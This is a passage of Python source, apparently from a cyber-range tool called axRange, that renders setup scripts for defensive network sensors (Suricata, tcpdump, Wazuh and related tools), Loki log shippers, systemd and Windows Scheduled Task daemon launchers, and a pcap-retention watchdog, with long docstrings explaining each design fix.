    Reads the sensor's decapsulated capture iface for up to `timeout_s` and exits 0
    iff a frame carrying the sentinel token is seen — preferring a short
    `tshark` `frame contains` (lowest latency, §11), falling back to
    `tcpdump -A | grep` if tshark is absent. No change to the sensor's black-box
    contract: it only reads the existing capture iface, adds no sensor interface."""
    hexpat = capture_sentinel_hex(token)
    q_if = iface.replace("'", "'\\''")
    t = int(timeout_s)
    # tshark path: -a duration caps the read; `frame contains <hex>` matches the
    # token bytes anywhere in the (decapped) frame; -c 1 stops at the first hit.
    tshark = (
        f"tshark -i '{q_if}' -a duration:{t} -c 1 "
        f"-Y 'frame contains {hexpat}' -n 2>/dev/null | grep -q ."
    )
    # tcpdump fallback: -A prints ASCII; grep the ASCII token (it is ASCII by
    # construction). `timeout` bounds the read; a hit makes grep exit 0.
    tcpdump = (
        f"timeout {t} tcpdump -l -n -A -i '{q_if}' icmp 2>/dev/null "
        f"| grep -a -m1 '{token}' >/dev/null"
    )
    return (
        f"if command -v tshark >/dev/null 2>&1; then {tshark}; "
        f"else {tcpdump}; fi"
    )


# ---------------------------------------------------------------------------
# OP-OVL defense overlay rendering — host agent (install-defense-agent MVP)
# ---------------------------------------------------------------------------

# tool -> (in-guest config destination, best-effort enable command). The agent
# *binary* is installed by an app (or baked); the overlay drops the config and
# enables the service. Unknown tools get a generic dest + `systemctl enable`.
_DEFENSE_TOOLS: dict[str, tuple[str, str]] = {
    "wazuh-agent": (
        "/var/ossec/etc/ossec.conf",
        "systemctl enable --now wazuh-agent 2>/dev/null "
        "|| /var/ossec/bin/wazuh-control restart 2>/dev/null || true",
    ),
    "auditd": (
        "/etc/audit/rules.d/axrange.rules",
        "systemctl enable --now auditd 2>/dev/null; augenrules --load 2>/dev/null || true",
    ),
    "filebeat": (
        "/etc/filebeat/filebeat.yml",
        "systemctl enable --now filebeat 2>/dev/null || true",
    ),
}


def _defense_tool_spec(tool: str) -> tuple[str, str]:
    if tool in _DEFENSE_TOOLS:
        return _DEFENSE_TOOLS[tool]
    safe = _ACT_SAFE.sub("-", tool)
    return (f"/etc/axrange/defense/{safe}.conf",
            f"systemctl enable --now {safe} 2>/dev/null || true")


def defense_agent_script_path(defense_id: str) -> str:
    """Deterministic in-guest path for a defense agent's config/enable script."""
    return f"{_OVERLAY_DIR}/defense-{_ACT_SAFE.sub('-', defense_id)}.sh"


_DEFAULT_SENSOR_RULES = (
    "# axRange default sensor rules (alert on the common recon/probe signatures the\n"
    "# inline activity generates). Replace via the defense entry's config: file.\n"
    'alert icmp any any -> any any (msg:"axRange ICMP ping"; itype:8; sid:9000001; rev:1;)\n'
    'alert tcp any any -> any any (msg:"axRange TCP SYN probe"; flags:S,12; sid:9000002; rev:1;)\n'
)


def _suricata_start_block(iface: str, rules_path: str, *, label: str) -> str:
    """Shared idempotent (re)start block for a Suricata process reading `iface`
    with ONLY `rules_path` (`-S`, exclusive). Stops/disables the packaged
    systemd unit first (`apt install suricata` auto-starts a unit sniffing the
    DEFAULT iface with the stock ruleset, which would otherwise win and fight
    over our mirror/decap iface — a live-verify-caught conflict), clears the
    stale pidfile a prior `pkill` leaves behind (else a re-run aborts "pid file
    exists ... Aborting!"), starts daemonized with a dedicated pidfile, and
    FAILS LOUD (`exit 1`) if the daemon doesn't come up — checked by cmdline
    (`pgrep -f 'suricata.*axrange'`), NOT `pgrep -x suricata` (its process comm
    is "Suricata-Main", so an exact-name match always misses it, LES-024).
    Shared by `render_sensor_setup` (in-scenario sensor VM) and
    `render_network_sensor_setup` (network sensor) so the two paths can't drift again
    (LES-025 reuse)."""
    return (
        "systemctl stop suricata 2>/dev/null || true\n"
        "systemctl disable suricata 2>/dev/null || true\n"
        "pkill -f 'suricata.*axrange' 2>/dev/null || true\n"
        "sleep 1\n"
        "rm -f /run/suricata-axrange.pid\n"
        f"suricata -S {rules_path} -i {iface} -l /var/log/suricata "
        "--pidfile /run/suricata-axrange.pid -D\n"
        "sleep 4\n"
        "pgrep -f 'suricata.*axrange' >/dev/null || { "
        f'echo "[axrange] FATAL: {label} did not start:" >&2; '
        "tail -15 /var/log/suricata/suricata.log 2>/dev/null >&2; exit 1; }\n"
        f'echo "[axrange] {label} on {iface}"\n'
    )


def render_network_sensor_setup(
    entry: dict[str, Any], *, iface: str, rules_content: str | None
) -> str:
    """Render a Suricata setup script for the network sensor
    (docs/SLICE_OVERLAY.md §4b Option C). Drops the ruleset, records metadata,
    and (re)starts Suricata reading the mirror iface with ONLY those rules
    (`-S`, exclusive), logging to /var/log/suricata (eve.json / fast.log).
    Idempotent: re-running replaces the rules + restarts. FAILS LOUD (`exit 1`)
    if suricata isn't installed on the network sensor or the daemon doesn't come up —
    a dead sensor must surface as a deploy failure, not a silent "configured"."""
    defense_id = str(entry.get("id") or "sensor")
    tool = str(entry.get("tool") or "suricata")
    ruleset = str(entry.get("ruleset") or "")
    observes = entry.get("observes") or []
    obs_summary = ",".join(
        str(o.get("net")) for o in observes if isinstance(o, dict) and o.get("net")
    )
    rules = rules_content if rules_content is not None else _DEFAULT_SENSOR_RULES
    rules_path = "/etc/suricata/rules/axrange.rules"
    meta_path = f"/etc/axrange/sensor/{_ACT_SAFE.sub('-', defense_id)}.env"
    return (
        "#!/bin/bash\n"
        f"# axRange network sensor: {defense_id} (tool={tool}) on iface {iface}\n"
        "set -u\n"
        "install -d -m 0755 /etc/axrange/sensor /var/log/suricata\n"
        f'install -d -m 0755 "$(dirname {rules_path})"\n'
        f"cat > {rules_path} <<'AXR_SENSOR_RULES'\n"
        f"{rules.rstrip(chr(10))}\n"
        "AXR_SENSOR_RULES\n"
        f"cat > {meta_path} <<'AXR_SENSOR_ENV'\n"
        f"DEFENSE_ID={defense_id}\n"
        f"TOOL={tool}\n"
        f"IFACE={iface}\n"
        f"RULESET={ruleset}\n"
        f"OBSERVES={obs_summary}\n"
        "AXR_SENSOR_ENV\n"
        # The network sensor is a standing box (docs/LESSONS.md LES-024 — not built here,
        # provisioned once out-of-band), so we don't apt-install it; but a missing
        # binary must fail the op, not report a silent "configured".
        "if ! command -v suricata >/dev/null 2>&1; then\n"
        '  echo "[axrange] FATAL: suricata not installed on the network sensor '
        '(install it first)" >&2\n'
        "  exit 1\n"
        "fi\n"
        + _suricata_start_block(iface, rules_path, label=f"network sensor {defense_id}")
    )


def network_sensor_script_path(defense_id: str) -> str:
    """Deterministic in-guest path for a network sensor's setup script."""
    return f"{_OVERLAY_DIR}/sensor-{_ACT_SAFE.sub('-', defense_id)}.sh"


# --- In-scenario sensor VM provisioning (sensors design Phase B) -------------
_SENSOR_DIR = "/etc/axrange/sensor"
_SENSOR_CAP_DIR = "/var/lib/axrange/capture"

# tcpdump-sensor pcap rotation (§ retention, ported from the standing
# appliance's o2/tcpdump-sensor/bin/capture-start -- whichever of time/size
# fires first rotates to a NEW timestamped file). Not operator-tunable (the
# appliance's own thresholds are also fixed in its recipe, config-file-driven
# only for the DISK-% watchdog below); keep this a floor, not a knob, to
# avoid over-engineering a v1 in-guest sensor.
#
# `-G 3600` (hourly, was 300/5min -- review SHOULD-FIX 2026-07-17): on an
# IDLE mirror, `-G 300` emitted a near-empty file every 5 minutes (288/day);
# disk usage barely moves so the %-watchdog never trims them and the file/
# inode count grows effectively unbounded. Hourly caps it to 24 idle files/
# day; the count-based prune below is the second half of that fix (catches
# it even if a slower link somehow still piles up files).
_CAPTURE_ROTATE_SECONDS = 3600
_CAPTURE_ROTATE_MB = 100

# Disk-% prune watchdog defaults (user decision 2026-07-17): prune oldest
# pcaps when the capture filesystem >= HIGH%, down to < LOW%. Overridable
# via adapter.conf CAPTURE_HIGH_WATER_PCT / CAPTURE_LOW_WATER_PCT
# (AdapterConfig.capture_high_water_pct / capture_low_water_pct), threaded in
# by `ConfigBackend._deploy_sensor`.
_CAPTURE_HIGH_WATER_PCT_DEFAULT = 85
_CAPTURE_LOW_WATER_PCT_DEFAULT = 70
# File-COUNT prune ceiling (review SHOULD-FIX 2026-07-17): independent of
# disk%, prune oldest-first once the pcap file count exceeds this, back down
# to <= this many. Catches the idle-link inode-growth case the disk-%
# watchdog alone can't see (tiny files barely move disk usage). Overridable
# via adapter.conf CAPTURE_MAX_FILES (AdapterConfig.capture_max_files).
_CAPTURE_MAX_FILES_DEFAULT = 2000
# Newest N pcaps the watchdog will never delete regardless of disk/count
# pressure -- protects tcpdump's currently-open file (always the newest by
# mtime). Small on purpose: an in-guest sensor VM's capture dir is expected
# to be much smaller than the standing appliance's (whose MIN_KEEP_FILES
# defaults to 10).
_CAPTURE_WATCHDOG_MIN_KEEP = 3


def sensor_script_path(sensor_id: str) -> str:
    """Deterministic in-guest path for an in-scenario sensor's setup script."""
    return f"{_SENSOR_DIR}/deploy-{_ACT_SAFE.sub('-', sensor_id)}.sh"


def sensor_shipper_path(sensor_id: str) -> str:
    return f"{_SENSOR_DIR}/ship-{_ACT_SAFE.sub('-', sensor_id)}.py"


def sensor_loki_artifact(sensor_type: str) -> str | None:
    """The structured artifact a `ship: loki` sensor tails into Loki, by type.
    tcpdump-sensor emits pcaps (a binary capture browsed/downloaded, not log
    lines) so it has no Loki artifact; zeek's multi-file logs are a follow-on."""
    return {
        "suricata-sensor": "/var/log/suricata/eve.json",
    }.get(sensor_type)


def render_sensor_loki_shipper(
    sensor_id: str, sensor_type: str, *, loki_url: str, artifact: str
) -> str:
    """Render the sensor->Loki shipper (`_render_loki_tail_shipper`) that
    tails the sensor's structured artifact (Suricata eve.json) and POSTs new
    lines to Loki's push API, labelled by sensor (sensors design Phase C,
    `export: { ship: loki }`). python3 is on the base image (the config
    slice already uses it); no Alloy/promtail install. Idempotent: a prior
    instance of this sensor's shipper unit is stopped/reset before the new
    one starts (GAP-A fix -- see `_render_loki_tail_shipper`'s docstring for
    why this is a named systemd unit rather than a `pkill`+`nohup` pair: the
    bootstrap wrapper this backend writes is `sensor_shipper_path(...) +
    '.sh'`, i.e. `.../ship-<safe>.py.sh` -- a bare `pkill -f 'ship-<safe>.py'`
    would match `.py` as a substring of that wrapper's OWN `.py.sh` path and
    self-kill the wrapper before it ever launched the shipper)."""
    safe = _ACT_SAFE.sub("-", sensor_id)
    push = loki_url.rstrip("/") + "/loki/api/v1/push"
    shipper_path = sensor_shipper_path(sensor_id)
    return _render_loki_tail_shipper(
        header_comment=f"axRange sensor->Loki shipper: {sensor_id} ({sensor_type})",
        bootstrap_comment=f"axRange Loki shipper bootstrap for sensor {sensor_id}",
        push_url=push,
        artifact_path=artifact,
        labels={"job": "axrange-sensor", "sensor": sensor_id, "sensor_type": sensor_type},
        shipper_path=shipper_path,
        runner_log=f"/var/log/axrange/ship-{safe}.log",
        unit=f"axr-ship-{safe}",
        echo_label=f"loki shipper for {sensor_id} -> {push}",
    )


def _sensor_decap_block(iface: str) -> str:
    """Bring up the in-guest flow-based gretap decap iface (`type gretap
    external`) — the receiver of the per-tap keyed gretaps the PVE host sends to
    this sensor's transport IP. Check-then-act so a re-run doesn't drop a live
    capture. The same mechanism the standing tcpdump-sensor uses, moved in-guest (§6)."""
    return (
        f"if ! ip link show {iface} >/dev/null 2>&1; then\n"
        f"  ip link add {iface} type gretap external\n"
        "fi\n"
        f"ip link set {iface} up\n"
    )


def _sensor_apt_ensure(pkg: str) -> str:
    """Shell: install `pkg` if missing (apt-get update first), then FAIL LOUD if
    the binary still isn't present — surfacing the apt error rather than a silent
    non-running sensor. (dev45 finding 2026-06-23: suricata is uninstallable from
    a mirror that has the backports suricata but not its backports `libhtp2`, and
    the old `|| true` swallowed it, leaving the daemon silently absent.) tcpdump
    is in Debian main, so this is a no-op there."""
    return (
        f"if ! command -v {pkg} >/dev/null 2>&1; then\n"
        "  DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1 || true\n"
        f"  DEBIAN_FRONTEND=noninteractive apt-get install -y {pkg} "
        f">/var/log/axrange/apt-{pkg}.log 2>&1 || true\n"
        "fi\n"
        f"if ! command -v {pkg} >/dev/null 2>&1; then\n"
        f'  echo "[axrange] FATAL: {pkg} could not be installed on this sensor VM:" >&2\n'
        f"  tail -8 /var/log/axrange/apt-{pkg}.log 2>/dev/null >&2 || true\n"
        f'  echo "  -> the sensor base image needs {pkg} available: a complete apt '
        "mirror, egress to its repo, or a pre-baked sensor image.\" >&2\n"
        "  exit 1\n"
        "fi\n"
    )


def systemd_daemon_start_block(
    unit: str,
    cmd: str,
    *,
    log_path: str,
    label: str,
    settle_s: int = 2,
    tail_lines: int = 12,
) -> str:
    """(Re)start a long-running capture daemon (tcpdump/zeek) as a DETACHED,
    deterministically-named transient systemd unit (`systemd-run --unit=<unit>
    --collect`) instead of a background `nohup ... &`.

    Root cause this closes (GAP-020's failure CLASS, confirmed live on the
    tcpdump/zeek sensor paths 2026-07-17): a `nohup`'d background process is
    REAPED the moment the qemu-guest-agent exec session that launched it ends
    -- the exact mechanism `_render_loki_tail_shipper`'s docstring documents
    and fixed for the Loki shipper (render.py ~line 501). A `pkill`-then-
    `nohup` re-up makes a Model-C re-`o2 up` WORSE: the `pkill` kills the
    running capture, then the replacement `nohup` is immediately reaped too --
    nothing running, nothing supervising. `--collect` auto-reaps a prior
    exited unit's recorded state, and the leading `stop`+`reset-failed`
    (harmless no-ops on a first run, and `stop` blocks until the old unit has
    actually exited) make a re-deploy idempotent WITHOUT any `pkill` at all --
    there is no pkill/reap race because there is no pkill (LES-051's concern
    doesn't even apply here: there is no match-pattern to self-collide with).

    `cmd` is the daemon's own invocation as a shell command string (e.g.
    `"exec tcpdump -i eth0 ..."`); it is wrapped in `bash -c '<cmd> >
    <log_path> 2>&1'` so stdout/stderr keep landing in the per-sensor log file
    the fail-loud check below tails (unchanged from the old nohup path, just
    no longer ALSO the only place the process lives).

    Fail-loud (mirrors `_suricata_start_block`'s contract, LES-035): asserts
    `systemctl is-active` after a short settle -- systemd tracks the daemon's
    REAL pid directly, so this is a stronger liveness check than an argv/comm
    pgrep match, not a weaker one. On failure it dumps both the unit's journal
    and its log file so the caller's AdapterError carries a real reason,
    never a silently-dead unit."""
    wrapped = sh_squote(f"{cmd} >{log_path} 2>&1")
    return (
        # Ensure the log file's directory exists BEFORE the unit's redirect
        # into it -- the `bash -c '<cmd> >LOG 2>&1'` redirect fails with "No
        # such file or directory" the instant LOG's dir is absent, and nothing
        # generic creates `/var/log/axrange` on a plain host (it was only ever
        # created as a side effect by sensor rendering / `provision-app` apt
        # logging, so a minimal twin's persona launch was the first to expose
        # it -- W1 dev45 live-verify, 2026-08-04). The Loki-shipper block above
        # already does exactly this (`mkdir -p $(dirname {runner_log})`); this
        # is the same fix at the shared primitive every persona driver
        # (scripted/replay) and sensor daemon launches through, so it lands
        # once for all of them (LES-037).
        f"mkdir -p $(dirname {log_path})\n"
        f"systemctl reset-failed {unit} 2>/dev/null || true\n"
        f"systemctl stop {unit} 2>/dev/null || true\n"
        f"systemd-run --unit={unit} --collect bash -c {wrapped}\n"
        f"sleep {settle_s}\n"
        f"systemctl is-active --quiet {unit} || {{ "
        f'echo "[axrange] FATAL: {label} did not start:" >&2; '
        f"journalctl -u {unit} --no-pager -n {tail_lines} >&2 2>/dev/null || true; "
        f"tail -{tail_lines} {log_path} >&2 2>/dev/null || true; exit 1; }}\n"
        f'echo "[axrange] {label} running as systemd unit {unit}"\n'
    )


def scheduled_task_start_block(
    task_name: str,
    exe: str,
    args: str,
    *,
    label: str,
    settle_s: int = 3,
) -> str:
    """Windows counterpart of `systemd_daemon_start_block` (2026-07-25, Windows
    persona-driver port, `docs/WORK_ORDER_persona_library.md`): (re)register +
    start a long-running process as a Windows **Scheduled Task** with an
    `AtStartup` trigger, run as `SYSTEM`, instead of a bare `Start-Process`
    child of the QGA exec session.

    **Why a Scheduled Task, not `Start-Process`** (the precedent
    `render_windows_sandcat_agent` set with `Start-Process -WindowStyle
    Hidden`): that precedent's process is a one-shot enroll-then-exit that only
    needs to survive the few seconds its own startup takes, and Sandcat
    daemonizes itself once running. A persona client is LONG-RUNNING BY DESIGN
    (its whole point is ongoing background traffic for as long as the twin is
    up) and must additionally survive a REBOOT — neither property a bare
    detached child gets for free, and neither `Start-Process`-launched process
    is supervised or auto-relaunched if it dies. A Scheduled Task is the
    Windows analog of a systemd transient unit: it is a first-class OS object
    (not a process attribute the launching session can inadvertently tear
    down), `AtStartup` gets reboot-persistence, and `Get-ScheduledTask`'s
    `.State` gives a real liveness signal (mirrors `systemctl is-active`,
    LES-086's Windows side of the same "don't trust a bare background child"
    lesson).

    Runs as `SYSTEM` (`-LogonType ServiceAccount`, no `-User`/`-Password`)
    because the QGA agent on Windows already executes as SYSTEM, so there is
    no separate credential to store or prompt for.

    Idempotent: `Stop-ScheduledTask`/`Unregister-ScheduledTask` both tolerate
    an absent task (`-ErrorAction SilentlyContinue`, the same "no-op on a
    first run" contract `systemd_daemon_start_block`'s leading `stop`/
    `reset-failed` pair has) before `Register-ScheduledTask -Force`
    (re)creates it fresh — no stale prior-run task definition survives a
    redeploy.

    Fail-loud: after `Start-ScheduledTask` + a settle, asserts
    `Get-ScheduledTask ... .State -eq 'Running'` — mirrors
    `systemd_daemon_start_block`'s `systemctl is-active` check, one level
    stronger than "the register/start cmdlets didn't throw" (a task can
    register and immediately fail to actually run).

    **Unbounded execution time (review fix, 2026-07-25):** `-Settings
    (New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) ...)`
    — with no `-Settings` at all, `Register-ScheduledTask` inherits the
    DEFAULT `ExecutionTimeLimit=PT72H`, so Task Scheduler kills the
    (infinite-loop) launched process after 3 days with no relaunch until the
    next `AtStartup` trigger fires (i.e. the next reboot). That is a
    Windows-only parity gap against the Linux `systemd-run --collect` unit,
    which carries no such cap — `[TimeSpan]::Zero` is the documented
    Microsoft sentinel for "no limit." Deliberately NOT setting
    `-RestartCount`/`-RestartInterval` here: crash-restart is a SEPARATE
    parity decision from the execution-time-limit fix, and the Linux
    `systemd-run` unit is `Restart=no` too.

    LES-036: `task_name`/`exe`/`args` are embedded via SINGLE-quoted PS
    literals (`''`-doubled) for the `$TaskName = '...'` /
    `New-ScheduledTaskAction -Execute '...' -Argument '...'` lines; `label` is
    embedded via `_ps_dq_only_escape` for the `Write-Output "..."` lines that
    interpolate it inside a PLAIN DOUBLE-quoted string (not nested inside a
    single-quoted literal the way `_ps_dq_escape`'s own sole call site is —
    reusing THAT helper here would double `'` unnecessarily) — a single
    escape style does not cover both quoting contexts (LES-036's own
    point)."""
    tn_sq = task_name.replace("'", "''")
    exe_sq = exe.replace("'", "''")
    args_sq = args.replace("'", "''")
    label_dq = _ps_dq_only_escape(label)
    return (
        "$ErrorActionPreference = 'Continue'\n"
        f"$TaskName = '{tn_sq}'\n"
        "Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue "
        "| Out-Null\n"
        "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false "
        "-ErrorAction SilentlyContinue | Out-Null\n"
        f"$AxrAction = New-ScheduledTaskAction -Execute '{exe_sq}' "
        f"-Argument '{args_sq}'\n"
        "$AxrTrigger = New-ScheduledTaskTrigger -AtStartup\n"
        "$AxrPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' "
        "-LogonType ServiceAccount -RunLevel Highest\n"
        # `Register-ScheduledTask` with no `-Settings` inherits the DEFAULT
        # `ExecutionTimeLimit=PT72H` -- Task Scheduler kills a still-running
        # task action after 3 days with no relaunch until the next trigger
        # (`AtStartup`, i.e. the next reboot). The task this launches is an
        # INFINITE LOOP (the persona client's `while ($true)` -- see
        # `personas/drivers/scripted.py`'s `_CLIENT_TEMPLATE_WINDOWS`), so
        # the default cap would silently truncate "as long as the twin is
        # up" traffic to "up to 72h, then dark until a reboot" -- a
        # Windows-only parity gap against the Linux `systemd-run --collect`
        # unit, which has no such cap. `ExecutionTimeLimit = [TimeSpan]::Zero`
        # means unbounded (Microsoft's documented sentinel for "no limit").
        # `AllowStartIfOnBatteries`/`DontStopIfGoingOnBatteries` matter on a
        # laptop-class guest (not the expected case here, but harmless and
        # correct either way). Deliberately NOT setting `-RestartCount`/
        # `-RestartInterval` here (a review call, 2026-07-25): crash-restart
        # is a SEPARATE parity decision from the execution-time-limit fix,
        # and the Linux `systemd-run` unit is `Restart=no` too (this driver
        # relies on `verify-capture`-style external heartbeat/re-apply to
        # notice + relaunch a dead instance, not in-guest auto-restart).
        "$AxrSettings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit "
        "([TimeSpan]::Zero) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n"
        "Register-ScheduledTask -TaskName $TaskName -Action $AxrAction "
        "-Trigger $AxrTrigger -Principal $AxrPrincipal -Settings $AxrSettings "
        "-Force | Out-Null\n"
        "Start-ScheduledTask -TaskName $TaskName\n"
        f"Start-Sleep -Seconds {int(settle_s)}\n"
        "$AxrTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue\n"
        "if (-not $AxrTask -or $AxrTask.State -ne 'Running') {\n"
        f'  Write-Output "[axrange] FATAL: {label_dq} did not start '
        '(task state: $($AxrTask.State))"\n'
        "  exit 1\n"
        "}\n"
        f'Write-Output "[axrange] {label_dq} running as scheduled task $TaskName"\n'
    )


def _ps_dq_only_escape(s: str) -> str:
    """Escape a value for safe interpolation inside a PowerShell DOUBLE-quoted
    string that is NOT also nested inside a single-quoted literal (unlike
    `_ps_dq_escape`, whose docstring documents it is specifically for the
    `-Filter "... -eq '{value}'"` NESTED shape and therefore ALSO doubles `'`
    for that inner literal). Escapes only what a plain `"..."` context needs:
    backtick, `$` (interpolation trigger), and `"` itself — a bare `'` needs
    no escaping here, since single quotes have no special meaning inside a
    double-quoted string. Order matters: escape the escape character
    (backtick) first."""
    return s.replace("`", "``").replace("$", "`$").replace('"', '`"')


def _render_capture_pcap_watchdog(
    sensor_id: str, safe: str, capdir: str, *,
    high_pct: int, low_pct: int, max_files: int = _CAPTURE_MAX_FILES_DEFAULT,
) -> str:
    """Install a disk-%/file-count prune watchdog for a tcpdump-sensor's
    ACCUMULATING pcap directory -- PORTED from the standing appliance's disk
    watchdog (`o2/tcpdump-sensor/bin/capture-watchdog` +
    `o2/tcpdump-sensor/systemd/capture-watchdog.timer`), not reinvented: same
    oldest-first-by-mtime, high/low-water-mark model, run every 60s from a
    systemd timer. Simplified for the in-guest single-sensor case (no
    SOURCE_TAG/compression -- one capture dir per sensor).

    Glob is `cap-*` (NOT `cap-*.pcap`, review MUST-FIX 2026-07-17, reproduced
    on real tcpdump 4.99.4): with `-w cap-<ts>.pcap -G ... -C ...`, tcpdump
    appends the size-rotation counter AFTER the extension -- `cap-<ts>.pcap`,
    `cap-<ts>.pcap1`, `cap-<ts>.pcap2`, ... -- so under sustained traffic the
    bulk of the rotated files are `.pcapN`, not `.pcap`. A `cap-*.pcap` glob
    matched at most one file per `-G` window and left every `.pcapN` file
    invisible to the prune, defeating retention on a busy link. `cap-*` is
    safe because this directory holds ONLY this sensor's pcaps (nothing else
    is ever written under `capdir`).

    Prunes when EITHER trigger fires (review SHOULD-FIX 2026-07-17): disk
    usage on `capdir`'s filesystem is AT OR ABOVE `high_pct`% (pruned back
    down to BELOW `low_pct`%), OR the file count exceeds `max_files` (pruned
    back down to AT MOST `max_files`) -- the count trigger catches the
    idle-mirror case where tiny near-empty rotated files barely move disk
    usage but still grow the file/inode count unbounded (paired with bumping
    `-G` to hourly, `_CAPTURE_ROTATE_SECONDS`, so idle links only produce 24
    files/day to begin with). Either way, pruning is oldest-first by mtime
    and always keeps the newest `_CAPTURE_WATCHDOG_MIN_KEEP` files untouched
    (protects tcpdump's currently-open file -- always the newest by mtime,
    same invariant the appliance's MIN_KEEP_FILES protects).

    NEVER deletes on tap teardown or a sensor restart/re-up -- this timer is
    the ONLY thing that ever removes a pcap. Idempotent: re-writing +
    re-enabling the unit/timer on every redeploy is a harmless no-op against
    an already-enabled/active timer -- it is never stopped or removed by a
    tap teardown (`axrange/o2control/taps.py` only touches tc/gretap/mirror
    config via the adapter, never the sensor VM's filesystem)."""
    unit = f"axr-cap-watchdog-{safe}"
    script_path = f"/usr/local/bin/{unit}.sh"
    svc_path = f"/etc/systemd/system/{unit}.service"
    timer_path = f"/etc/systemd/system/{unit}.timer"

    script = (
        "#!/bin/bash\n"
        f"# axRange capture-dir disk/count watchdog for sensor {sensor_id}\n"
        "# (ported from o2/tcpdump-sensor/bin/capture-watchdog).\n"
        "set -u\n"
        f"DIR={sh_squote(capdir)}\n"
        f"HIGH={int(high_pct)}\n"
        f"LOW={int(low_pct)}\n"
        f"MAX_FILES={int(max_files)}\n"
        f"MIN_KEEP={_CAPTURE_WATCHDOG_MIN_KEEP}\n"
        '[ -d "$DIR" ] || exit 0\n'
        'usage=$(df --output=pcent "$DIR" 2>/dev/null | tail -1 | tr -dc 0-9)\n'
        '[ -n "$usage" ] || exit 0\n'
        # `cap-*` (NOT `cap-*.pcap`) -- see docstring: tcpdump's -C rotation
        # counter lands AFTER the extension (`cap-<ts>.pcap1`, `.pcap2`, ...),
        # and this directory holds only this sensor's pcaps.
        'total=$(find "$DIR" -maxdepth 1 -type f -name "cap-*" | wc -l)\n'
        '[ "$usage" -ge "$HIGH" ] || [ "$total" -gt "$MAX_FILES" ] || exit 0\n'
        "mapfile -t victims < <(\n"
        '    find "$DIR" -maxdepth 1 -type f -name "cap-*" \\\n'
        "        -printf '%T@ %p\\n' \\\n"
        "        | sort -n \\\n"
        '        | head -n -"$MIN_KEEP" \\\n'
        "        | awk '{ for (i=2; i<=NF; i++) printf \"%s%s\", $i, "
        '(i<NF?" ":"\\n") }\'\n'
        ")\n"
        "deleted=0\n"
        'for f in "${victims[@]}"; do\n'
        '    [ -n "$f" ] || continue\n'
        # Re-check BOTH triggers before each deletion -- stop as soon as
        # neither holds any more, even mid-loop.
        '    if [ "$usage" -le "$LOW" ] && [ "$total" -le "$MAX_FILES" ]; then\n'
        "        break\n"
        "    fi\n"
        '    rm -f -- "$f" && deleted=$((deleted + 1))\n'
        "    total=$((total - 1))\n"
        '    usage=$(df --output=pcent "$DIR" 2>/dev/null | tail -1 | tr -dc 0-9)\n'
        '    [ -n "$usage" ] || usage=0\n'
        "done\n"
        "logger -t " + unit + ' "pruned $deleted file(s) in $DIR; disk now '
        '$usage% (target $LOW%), files now $total (cap $MAX_FILES)" '
        '2>/dev/null || true\n'
    )
    service = (
        "[Unit]\n"
        f"Description=axRange sensor {sensor_id} capture pcap-retention watchdog\n"
        "\n"
        "[Service]\n"
        "Type=oneshot\n"
        f"ExecStart={script_path}\n"
    )
    timer = (
        "[Unit]\n"
        f"Description=Run {unit} every 60s\n"
        "\n"
        "[Timer]\n"
        "OnBootSec=60s\n"
        "OnUnitActiveSec=60s\n"
        "AccuracySec=5s\n"
        f"Unit={unit}.service\n"
        "\n"
        "[Install]\n"
        "WantedBy=timers.target\n"
    )
    return (
        f"cat > {script_path} <<'AXR_WATCHDOG_SH'\n"
        f"{script.rstrip(chr(10))}\n"
        "AXR_WATCHDOG_SH\n"
        f"chmod 0755 {script_path}\n"
        f"cat > {svc_path} <<'AXR_WATCHDOG_SVC'\n"
        f"{service.rstrip(chr(10))}\n"
        "AXR_WATCHDOG_SVC\n"
        f"cat > {timer_path} <<'AXR_WATCHDOG_TIMER'\n"
        f"{timer.rstrip(chr(10))}\n"
        "AXR_WATCHDOG_TIMER\n"
        "systemctl daemon-reload 2>/dev/null || true\n"
        f"systemctl enable --now {unit}.timer 2>/dev/null || "
        f'echo "[axrange] WARNING: capture watchdog timer for {sensor_id} '
        'did not enable" >&2\n'
    )


def render_sensor_setup(
    sensor_id: str,
    sensor_type: str,
    *,
    iface: str,
    config_content: str | None = None,
    capture_high_water_pct: int = _CAPTURE_HIGH_WATER_PCT_DEFAULT,
    capture_low_water_pct: int = _CAPTURE_LOW_WATER_PCT_DEFAULT,
    capture_max_files: int = _CAPTURE_MAX_FILES_DEFAULT,
) -> str:
    """Render the in-guest setup script for an in-scenario sensor VM (sensors
    design Phase B, docs/design/06-taps-sensors.md). Brings up the flow-based
    gretap decap iface, then installs + (re)starts the tool the `type` selects,
    reading that iface. Idempotent: re-running replaces config + restarts.
    **Fail-loud**: if the tool can't be installed, or the daemon doesn't come up,
    the script exits non-zero (with the apt / tool error) so deploy-sensor FAILS
    visibly instead of leaving a silent non-running sensor.

    Supported types: `tcpdump-sensor` (rotating pcaps), `suricata-sensor`
    (eve.json IDS), `zeek-sensor` (conn/dns/http logs). Unknown ⇒ error.
    """
    safe = _ACT_SAFE.sub("-", sensor_id)
    head = (
        "#!/bin/bash\n"
        f"# axRange sensor: {sensor_id} (type={sensor_type}) decap iface {iface}\n"
        "set -u\n"
        f"install -d -m 0755 {_SENSOR_DIR} {_SENSOR_CAP_DIR} /var/log/axrange\n"
        + _sensor_decap_block(iface)
        + f"cat > {_SENSOR_DIR}/{safe}.env <<'AXR_SENSOR_ENV'\n"
        f"SENSOR_ID={sensor_id}\n"
        f"SENSOR_TYPE={sensor_type}\n"
        f"IFACE={iface}\n"
        "AXR_SENSOR_ENV\n"
    )

    if sensor_type == "tcpdump-sensor":
        capdir = f"{_SENSOR_CAP_DIR}/{safe}"
        unit = f"axr-sensor-{safe}"
        log_path = f"/var/log/axrange/tcpdump-{safe}.log"
        # Timestamped, ACCUMULATING pcaps under a stable per-sensor dir -- a
        # restart/re-up APPENDS a new file, it never overwrites prior capture
        # history the way the old cyclic `-W 50` ring did (a redeploy reset the
        # ring to file `00`, silently discarding everything captured before
        # it). `-G` (time) + `-C` (size) together, whichever fires first,
        # PORTS the standing appliance's own rotation recipe
        # (o2/tcpdump-sensor/bin/capture-start) rather than reinventing it --
        # tcpdump only expands the strftime template in `-w` when `-G` is
